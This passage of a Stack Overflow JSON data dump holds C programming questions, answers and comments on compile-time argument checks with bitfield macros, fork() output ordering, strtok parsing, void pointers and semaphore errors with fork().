"https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545837076, "post_id": 53933277, "comment_id": 94707769, "body": "@LaiYanHui While this &quot;works&quot;, the best thing to do is perform the check at run time.  Trying to do something like this is asking for trouble."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545837249, "post_id": 53933277, "comment_id": 94707828, "body": "Roger that. Actually I had thought of doing that during run time but it would result in building a program instead of making a header so I gave this a try. #wink"}, {"owner": {"reputation": 34185, "user_id": 5470596, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BITFt.jpg?s=128&g=1", "display_name": "YSC", "link": "https://stackoverflow.com/users/5470596/ysc"}, "edited": false, "score": 0, "creation_date": 1545839256, "post_id": 53933277, "comment_id": 94708451, "body": "This is a funny answer. +1 for not being useful ^^"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 6, "last_activity_date": 1545835401, "last_edit_date": 1545835401, "creation_date": 1545833893, "answer_id": 53933277, "question_id": 53932643, "link": "https://stackoverflow.com/questions/53932643/how-can-i-generate-a-compilation-error-to-prevent-certain-values-from-being-pass/53933277#53933277", "title": "How can I generate a compilation error to prevent certain values from being passed to a function", "body": "<p>This is an ugly cludge that will be specific to this function, but you can do it like this:</p>\n\n<pre><code>#define num_sys_convert(x, b1, b2) \\\n    ((void)(struct digits { \\\n        int d1:(( (x)             %10 &gt;= (b1) ? -1 : 1)); \\\n        int d2:((((x) /        10)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d3:((((x) /       100)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d4:((((x) /      1000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d5:((((x) /     10000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d6:((((x) /    100000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d7:((((x) /   1000000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d8:((((x) /  10000000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int d9:((((x) / 100000000)%10 &gt;= (b1) ? -1 : 1)); \\\n        int da:((((x) /1000000000)%10 &gt;= (b1) ? -1 : 1)); \\\n    }){0}, num_sys_convert_real(x, b1, b2))\n\n\nchar * num_sys_convert_real(int num_value,  int old_base, int targeted_base) {\n    ...\n}\n</code></pre>\n\n<p>The real function is wrapped by a call to the above macro.  This macro defines a struct with a number of bitfields, where the length of each bitfield is dependent on a specific decimal digit of the first argument.  If that digit is greater than or equal to the value of the second argument (i.e. the base), the size of the bitfield is set to -1, which is invalid and produces a compliation error.</p>\n\n<p>If the number does look like a valid number for the given base, the end result is that an temporary object of the given struct type is created via a compound literal and used in an expression as the left side of the comma operator, meaning its value is discarded, and the actual function call is the right side of the comma operator.</p>\n\n<p>This works under the assumption that:</p>\n\n<ul>\n<li>The first argument to the function is <strong>decimal integer literal</strong></li>\n<li>The second argument to the function is an <strong>integer literal</strong></li>\n<li>The literal has type <code>int</code>, i.e. no type suffix</li>\n<li>An <code>int</code> is 32 bits in length</li>\n</ul>\n\n<p>It will <strong>always</strong> fail to compile if you do this:</p>\n\n<pre><code>int value = 101;\nnum_sys_convert(value, 2, 10);\n</code></pre>\n\n<p>Or this:</p>\n\n<pre><code>int base = 2;\nnum_sys_convert(101, base, 10);\n</code></pre>\n\n<p>Because an expression used to set the size of a bitfield must be a compile time constant expressions.</p>\n\n<p>Also, this would fail the check:</p>\n\n<pre><code>num_sys_convert(0x10, 2, 10);\n</code></pre>\n\n<p>Because the hex value 0x10 has the decimal value 16.</p>\n\n<p>And this would pass the check:</p>\n\n<pre><code>num_sys_convert(0xa, 2, 10);\n</code></pre>\n\n<p>Because the hex value 0xa has the decimal value 10.</p>\n\n<hr>\n\n<p>As this is such a cludge, <strong>don't do this</strong>!  </p>\n\n<p>Rather than attempting to check parameters at compile time, the proper thing to do is to validate the parameters at run time inside of the function and to return some sort of error code if the parameters are invalid.</p>\n"}], "owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 1, "closed_date": 1545862219, "accepted_answer_id": 53933277, "answer_count": 1, "score": 2, "last_activity_date": 1545920747, "creation_date": 1545830293, "last_edit_date": 1545920747, "question_id": 53932643, "link": "https://stackoverflow.com/questions/53932643/how-can-i-generate-a-compilation-error-to-prevent-certain-values-from-being-pass", "closed_reason": "Needs details or clarity", "title": "How can I generate a compilation error to prevent certain values from being passed to a function", "body": "<p>Not this: <a href=\"https://stackoverflow.com/questions/1292532/how-to-generate-a-compilation-error-when-pointer-types-differ\">How to generate a compilation error when pointer types differ?</a></p>\n\n<p>That <strong>is</strong> useful but I wanted to block values, not types.  For example: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\n\nchar * num_sys_convert(int num_value,  int old_base, int targeted_base) {\n    /* These are the codes. Only clever people can see it. The king would surely be pleased to see this. */\n}\n\nint main() {\n    printf(\"%s\",num_sys_convert(10011,2,10));    // this should be fine\n    printf(\"%s\",num_sys_convert(10021,2,10));    // this should generate a compile-time error\n    getch();\n}\n</code></pre>\n\n<p>I'm trying to make a header, in case of there will be mistake(s) while typing, I wanted to add a little function to help that out. Since the old base is binary, the digit <code>2</code> (or higher) should NOT exist in the decimal representation of the given number.</p>\n\n<p>Is it possible in C to block certain values to go into the function as parameter <em>at compilation time</em>?</p>\n"}, {"tags": ["c", "linux", "fork"], "comments": [{"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 1, "creation_date": 1545835451, "post_id": 53932577, "comment_id": 94707241, "body": "<i><code>while((p1 = fork()) == -1);</code></i> looks  a lot like Android&#39;s <a href=\"https://www.google.com/search?q=Rage+Against+the+Cage+Android\" rel=\"nofollow noreferrer\">Rage Against the Cage</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545878824, "post_id": 53932577, "comment_id": 94718093, "body": "in C, the function: <code>fork()</code> prototype is brought visible by the combination of the two header files: <code>#include &lt;sys&#47;types.h&gt;</code> and <code>#include &lt;unistd.h&gt;</code>.  Without those two header files, the code is relying on  the default types (usually <code>int</code>, but not necessarily)  Your compiler should have told you about this problem."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545879206, "post_id": 53932577, "comment_id": 94718158, "body": "regarding: <code>while((p1 = fork()) == -1);</code>  Most likely, if <code>fork()</code> fails, it will continue to fail.  This is NOT a valid/reliable way to check for an error in the call to <code>fork()</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545879400, "post_id": 53932577, "comment_id": 94718188, "body": "when a parent process forks a child process, it should always call <code>wait()</code> or <code>waitpid()</code> so that it does not exit before the child exits."}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 9682620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd56555125d7ccf81f864634a011df4?s=128&d=identicon&r=PG&f=1", "display_name": "Jaycee Zhou", "link": "https://stackoverflow.com/users/9682620/jaycee-zhou"}, "edited": false, "score": 0, "creation_date": 1545830671, "post_id": 53932652, "comment_id": 94705669, "body": "OK, I got it. Thank you!"}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1545830907, "post_id": 53932652, "comment_id": 94705750, "body": "Note: The (mostly) predictable ordering may be because they&#39;re running in a virtual machine (note the VirtualBox in the prompt). If the VM is only simulating one processor, then only one process actually runs at a time, and it would make sense for the parent&#39;s time slice to continue after the <code>fork</code> long enough for it to perform the output, so it always ends up outputting parent first (the one that outputs <code>a</code>). As for <code>c</code> preceding <code>b</code>, the scheduler may (as implementation detail) tend to prioritize the last launched child (leading to <code>c</code> being the next output); that&#39;s just a guess though."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1545832197, "post_id": 53932652, "comment_id": 94706217, "body": "Also note: If you want to have all the output on a single line, you should have the parent process call <code>wait(2)</code> (2 being the man page section, not the argument) twice, then <code>printf(&quot;\\n&quot;);</code> so the newline is only output once, and only after all other output. If you want to keep the output unpredictable, you&#39;d also need to add <code>fflush(stdout);</code> after <code>printf(&quot;a&quot;);</code> but before the <code>wait</code> calls, otherwise when <code>stdout</code> is line or block buffered (the default), the parent process will always delay flushing buffers until the child processes have exited, so <code>a</code> will end up predictably last."}], "tags": [], "owner": {"reputation": 47447, "user_id": 1172428, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/240fe123035f1c6e184f59da2f1465d9?s=128&d=identicon&r=PG", "display_name": "FatalError", "link": "https://stackoverflow.com/users/1172428/fatalerror"}, "is_accepted": true, "score": 6, "last_activity_date": 1545830330, "creation_date": 1545830330, "answer_id": 53932652, "question_id": 53932577, "link": "https://stackoverflow.com/questions/53932577/why-is-there-an-extra-percent-sign-after-the-output/53932652#53932652", "title": "Why is there an extra percent sign after the output?", "body": "<p>Your shell (zsh) added it to indicate the output did not end with a newline character.</p>\n\n<p>To get rid of it, just end your output with a <code>\\n</code>.</p>\n\n<p>As to the other question, it's not deterministic. If you ran it elsewhere or enough times you might get different results. But it's an illustration of why synchronization problems can be so hard to find, because things can seem to run the same (almost) all the time.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1545881740, "last_edit_date": 1545881740, "creation_date": 1545880203, "answer_id": 53939328, "question_id": 53932577, "link": "https://stackoverflow.com/questions/53932577/why-is-there-an-extra-percent-sign-after-the-output/53939328#53939328", "title": "Why is there an extra percent sign after the output?", "body": "<p>the following proposed code:</p>\n\n<ol>\n<li>correctly checks the returned value from <code>fork()</code></li>\n<li>correctly includes the necessary header files</li>\n<li>correctly waits for the child processes to exit before the parent process exits</li>\n<li>still does not terminate output strings with '\\n' so (in this case) the output is not displayed on the terminal until after the process exits.</li>\n<li>uses the proper typing for pid variables</li>\n<li>uses one of the two valid signatures for <code>main()</code></li>\n</ol>\n\n<p>And now the proposed code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;     // printf(), perror()\n#include &lt;stdlib.h&gt;    // exit(), EXIT_FAILURE, EXIT_SUCCESS\n#include &lt;sys/types.h&gt; // pid_t\n#include &lt;unistd.h&gt;    // fork()\n#include &lt;sys/wait.h&gt;  // wait()\n\nint main( void )\n{\n    pid_t p1;\n    pid_t p2;\n\n    p1 = fork();\n    switch( p1 )\n    {\n        case -1:\n            perror( \"first fork failed\" );\n            exit( EXIT_FAILURE );\n            break;\n\n        case 0:  // child 1\n            printf(\"child 1\");\n            exit( EXIT_SUCCESS );\n            break;\n\n        default:  // parent\n            p2 = fork();\n            switch( p2 )\n            {\n                case -1:\n                    perror( \"second fork failed\" );\n                    exit( EXIT_FAILURE );\n                    break;\n\n                case 0: // child 2\n                    printf(\"child 2\");\n                    exit( EXIT_SUCCESS );\n                    break;\n\n                default:\n                    printf(\"parent\");\n                    while( wait( NULL ) != -1 );\n                    break;\n            }  // end switch 2\n    } // end switch 1\n}\n</code></pre>\n\n<p>a typical run of the code results in:</p>\n\n<pre><code>child 2child 1parent\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 9682620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd56555125d7ccf81f864634a011df4?s=128&d=identicon&r=PG&f=1", "display_name": "Jaycee Zhou", "link": "https://stackoverflow.com/users/9682620/jaycee-zhou"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 569, "favorite_count": 0, "accepted_answer_id": 53932652, "answer_count": 2, "score": 1, "last_activity_date": 1545881740, "creation_date": 1545829916, "question_id": 53932577, "link": "https://stackoverflow.com/questions/53932577/why-is-there-an-extra-percent-sign-after-the-output", "title": "Why is there an extra percent sign after the output?", "body": "<p>I'm learning fork() function under linux recently. I wrote a program.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    int p1, p2;\n    while((p1 = fork()) == -1);\n    if(p1 == 0)\n        printf(\"b\");\n    else{\n        while((p2 = fork()) == -1);\n        if(p2 == 0)\n            printf(\"c\");\n        else\n            printf(\"a\");\n    }\n}\n</code></pre>\n\n<p>After I compiled and run it, I got a unexpected percent sign.</p>\n\n<p><a href=\"https://i.stack.imgur.com/kEqi4.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/kEqi4.png\" alt=\"enter image description here\"></a></p>\n\n<p>But if I add \\n after those letters, the percent sign disappears.</p>\n\n<p><a href=\"https://i.stack.imgur.com/tS5wY.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/tS5wY.png\" alt=\"enter image description here\"></a></p>\n\n<p>Is there anyone knows the reason?</p>\n\n<p>And I have another question. Every time I reran the program, I got the same answer. It always shows \"acb\". The order is always the same. Why?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1545829802, "post_id": 53932393, "comment_id": 94705397, "body": "Just alternate the delimeter on subsequent calls of strtok. See the manual."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1545829880, "post_id": 53932393, "comment_id": 94705418, "body": "...and call strtok with null for the string on subsequent calls. Again, see the manual."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1545830256, "post_id": 53932393, "comment_id": 94705537, "body": "Note that in <code>goods[counter] = value;</code> the value of <code>value</code> is not copied and <code>value</code> is reused with every line read."}], "owner": {"reputation": 155, "user_id": 7568511, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/491f88205e921d553785e307968979c1?s=128&d=identicon&r=PG&f=1", "display_name": "jordibenck", "link": "https://stackoverflow.com/users/7568511/jordibenck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 124, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1545830701, "creation_date": 1545828807, "last_edit_date": 1545828964, "question_id": 53932393, "link": "https://stackoverflow.com/questions/53932393/c-reset-strtok-on-certain-condition", "title": "C reset strtok on certain condition", "body": "<p>I want to read lines of a file and then use the values to do certain actions. However how can I reset the pointer of line/value so it reads the next instance till ';' ?</p>\n\n<p>I am trying to read the following line:</p>\n\n<pre><code>Roatan;57-114;250-500;125-375;34-85;68-170;40-80;85-170;100-200;450-900;30-60;34-85;170-340;57-114;500-1000;23-57\n</code></pre>\n\n<p>I am using the following code to do this:</p>\n\n<pre><code>char line[400];\nint count = 0;\n\nFILE *file;\nfile = fopen(\"assets/goederen hoeveelheid.csv\", \"r\");\n\nwhile (fgets(line, sizeof line, file) != NULL) {\n    if (count &gt; 6) {\n        char* goods[50];\n        int counter = 0;\n        Goods* gameGoods = NULL;\n        Harbor* harbor = NULL;\n\n        char* value = strtok(line, \";\");\n\n        while (value != NULL)\n        {\n            goods[counter] = value;\n\n            if (counter &gt; 0) {\n                harbor = game-&gt;getHarbor(hashHarbors(goods[0]));\n                gameGoods = harbor-&gt;addGoods(getGoods(counter));\n\n                char* amount = strtok(value, \"-\");\n                int minAmount = atoi(amount);\n                int maxAmount = -1;\n                amount = strtok(NULL, \"-\");\n\n                if (amount != NULL)\n                {\n                    maxAmount = atoi(amount);\n                }\n\n                if (minAmount &gt; -1 &amp;&amp; maxAmount &gt; -1) {\n                    gameGoods-&gt;setAmountsAtHarbor(getGoods(counter), minAmount, maxAmount);\n                }                   \n            }\n\n            value = strtok(NULL, \";\");\n            counter++;\n        }\n    }\n    count++;\n}\n\nfclose(file);\n</code></pre>\n\n<p>So the program has to be like the following: read a line from the file, read the first instance till ';' and store it in goods[counter] then read the next instance till ';' get the number before the '-' and then after. Next, read the next instance till ';'.</p>\n"}, {"tags": ["c", "pointers", "void", "void-pointers"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1545827465, "post_id": 53932143, "comment_id": 94704636, "body": "You can use a <code>void</code> pointer when you want to hide a data structure inside a module and give the user &quot;just a pointer&quot; to interact with your module."}, {"owner": {"reputation": 192, "user_id": 3548251, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/100002421418230/picture?type=large", "display_name": "Shubham Pendharkar", "link": "https://stackoverflow.com/users/3548251/shubham-pendharkar"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1545827789, "post_id": 53932143, "comment_id": 94704758, "body": "Thanks @PaulOgilvie for you answer, but I can achieve the same functionality using the char pointer too, then why using a void pointer?"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 3, "creation_date": 1545827987, "post_id": 53932143, "comment_id": 94704816, "body": "That&#39;s sort of like asking why you would ever put a <code>const</code> qualifier on something when you &quot;can achieve the same functionality&quot; without it by simply not assigning to it. But being able to convey the meaning (both to human readers and to the compiler) has value in itself."}], "answers": [{"tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": true, "score": 9, "last_activity_date": 1545827747, "creation_date": 1545827747, "answer_id": 53932210, "question_id": 53932143, "link": "https://stackoverflow.com/questions/53932143/when-to-use-a-void-pointer-over-a-char-pointer/53932210#53932210", "title": "When to use a void pointer over a char pointer?", "body": "<p>A <code>void</code> pointer is a pointer to \"any type\", and it needs to be converted to a pointer to an actual type before it may be dereferenced.</p>\n\n<p>A pointer to <code>char</code> is a pointer to <code>char</code>, that happens to have the property that you could also access (parts of) other types through it.</p>\n\n<p>You should use <code>void *</code> when the meaning is intended to be \"any type\" (or one of several types, etc). You should use <code>char *</code> when you access either a <code>char</code> (obviously), or the individual bytes of another type <em>as raw bytes</em>.</p>\n"}, {"tags": [], "owner": {"reputation": 374, "user_id": 9858322, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hUNcB.jpg?s=128&g=1", "display_name": "rsonx", "link": "https://stackoverflow.com/users/9858322/rsonx"}, "is_accepted": false, "score": 1, "last_activity_date": 1545828221, "creation_date": 1545828221, "answer_id": 53932292, "question_id": 53932143, "link": "https://stackoverflow.com/questions/53932143/when-to-use-a-void-pointer-over-a-char-pointer/53932292#53932292", "title": "When to use a void pointer over a char pointer?", "body": "<p>void pointers are used when the type of the variable the pointer would refer to is unknown. For example the malloc() function returns a void pointer referencing to the allocated memory. You could then cast the pointer to other data types.</p>\n\n<p>There might be instances when you need to create a pointer to just store the address. You could use a void pointer there.</p>\n"}, {"tags": [], "owner": {"reputation": 751, "user_id": 5552166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8941926688c6212b73aa67cbb2c70428?s=128&d=identicon&r=PG&f=1", "display_name": "hessam hedieh", "link": "https://stackoverflow.com/users/5552166/hessam-hedieh"}, "is_accepted": false, "score": -1, "last_activity_date": 1545828416, "creation_date": 1545828416, "answer_id": 53932328, "question_id": 53932143, "link": "https://stackoverflow.com/questions/53932143/when-to-use-a-void-pointer-over-a-char-pointer/53932328#53932328", "title": "When to use a void pointer over a char pointer?", "body": "<p>Its more about code readability and structure, I dont wanna see a function need input for lets say pointer to struct and get it via char* , the first thing that comes to my mind if I see char* is a string(in pure c term, array of chars, null terminated), on the other hand with void* I am warned that something general is going to be passed, a good example is <code>qsort</code> function.<br>\n so its not all about wether it works or compiles, it should be readable too, </p>\n"}], "owner": {"reputation": 192, "user_id": 3548251, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/100002421418230/picture?type=large", "display_name": "Shubham Pendharkar", "link": "https://stackoverflow.com/users/3548251/shubham-pendharkar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 722, "favorite_count": 1, "accepted_answer_id": 53932210, "answer_count": 3, "score": 5, "last_activity_date": 1545828416, "creation_date": 1545827365, "question_id": 53932143, "link": "https://stackoverflow.com/questions/53932143/when-to-use-a-void-pointer-over-a-char-pointer", "title": "When to use a void pointer over a char pointer?", "body": "<p>In which situation should we prefer a void pointer over a char pointer or vice-versa?</p>\n\n<p>As a matter of fact both can be type cast to any of the data types.</p>\n"}, {"tags": ["c", "semaphore", "futex"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1545830888, "post_id": 53932013, "comment_id": 94705742, "body": "1. <code>int sem_init(sem_t *sem, int pshared, unsigned int value);</code>, note the <code>unsigned</code>. 2. passing a <code>sem_t</code> by value"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545931289, "post_id": 53932013, "comment_id": 94735726, "body": "regarding statements like: <code>sem_init(&amp;s1, 1, -1);</code>  the third parameter must be a unsigned value.  Here is the syntax from the MAN page: ` int sem_init(sem_t *sem, int pshared, unsigned int value);`"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545931713, "post_id": 53932013, "comment_id": 94735886, "body": "in function: <code>main()</code>, before the statement: <code>return 0;</code> there should be a loop, that contains: <code>while( wait( NULL ) != -1){;} </code> So that the parent process does not exit before all the child processes have exited"}], "answers": [{"tags": [], "owner": {"reputation": 3126, "user_id": 2955790, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vShcC.png?s=128&g=1", "display_name": "Duck Dodgers", "link": "https://stackoverflow.com/users/2955790/duck-dodgers"}, "is_accepted": false, "score": -1, "last_activity_date": 1545831052, "last_edit_date": 1545831052, "creation_date": 1545830602, "answer_id": 53932696, "question_id": 53932013, "link": "https://stackoverflow.com/questions/53932013/how-to-find-what-causes-the-futex-facility-to-fail/53932696#53932696", "title": "How to find what causes the futex facility to fail?", "body": "<p>So, there were 2 small changes to be made in that code.</p>\n\n<ol>\n<li>First you need to initialize the semaphores correctly. <code>sem_init(&amp;s1, 1, 1);</code> instead of <code>sem_init(&amp;s1, 1, -1);</code></li>\n<li>Your parent process needs to wait for all the child processes to exit, before it itself exits. Hence the <code>wait(NULL);</code> in the main before the program ends.</li>\n</ol>\n\n<p>.</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;semaphore.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\n\n\nvoid func1(sem_t sem1, sem_t sem2);\nvoid func2(sem_t sem1, sem_t sem2);\nvoid func3(sem_t sem1, sem_t sem2);\nvoid func4(sem_t sem1, sem_t sem2);\nvoid func5(sem_t sem1, sem_t sem2);\n\nint main() {\n    sem_t s1;\n    sem_t s2;\n\n    sem_init(&amp;s1, 1, 1);\n    sem_init(&amp;s2, 1, 1);\n\n    void (*arr[5])(sem_t, sem_t) = {func1, func2, func3, func4, func5};\n\n    pid_t child_pid, wpid;\n    int status;\n\n    for (int i=0; i&lt;5; i++) {\n        child_pid = fork();\n        if (child_pid == 0) {\n            arr[i](s1, s2);\n            // break;\n            exit(0);\n        }\n    }\n\n    wait(NULL);\n    // while ((wpid = wait(&amp;status)) &gt; 0);\n    return 0;\n}\n\n\nvoid func1(sem_t sem1, sem_t sem2) {\n    system(\"echo D1\");\n    sem_post(&amp;sem1);\n}\n\nvoid func2(sem_t sem1, sem_t sem2) {\n    system(\"echo D2\");\n    sem_post(&amp;sem1);\n}\n\nvoid func3(sem_t sem1, sem_t sem2) {\n    system(\"echo D3\");\n    sem_post(&amp;sem2);\n}\n\nvoid func4(sem_t sem1, sem_t sem2) {\n    sem_wait(&amp;sem1);\n    system(\"echo D4\");\n    sem_post(&amp;sem2);\n}\n\nvoid func5(sem_t sem1, sem_t sem2) {\n   sem_wait(&amp;sem2);\n    system(\"echo D5\");\n}\n</code></pre>\n\n<p>You can run and check here. <a href=\"https://onlinegdb.com/rk_IbbWZV\" rel=\"nofollow noreferrer\">oneline code</a></p>\n"}, {"comments": [{"owner": {"reputation": 33, "user_id": 6649332, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/vuYdx.png?s=128&g=1", "display_name": "AQUATH", "link": "https://stackoverflow.com/users/6649332/aquath"}, "edited": false, "score": 0, "creation_date": 1545831355, "post_id": 53932717, "comment_id": 94705911, "body": "Thanks, I understand my fault but unfortunately this isn&#39;t what causes the error. The problem occurs because I initialize my semaphores with negative value. I have to find a workaround for this, as I am obliged to use no more than 2 semaphores.  Edit for your edit: exactly."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 33, "user_id": 6649332, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/vuYdx.png?s=128&g=1", "display_name": "AQUATH", "link": "https://stackoverflow.com/users/6649332/aquath"}, "edited": false, "score": 1, "creation_date": 1545831664, "post_id": 53932717, "comment_id": 94706008, "body": "@AQUATH Passing-by-value is an issue, too.  If you pass-by-value, the semaphore a functions waits on or posts to might not be the same as the one used by another process.  It <i>might</i> &quot;work&quot; on some implementations (for example, if <code>sem_t</code> is implemented as a pointer to an implementation-defined object), but it can&#39;t be counted on."}, {"owner": {"reputation": 5821, "user_id": 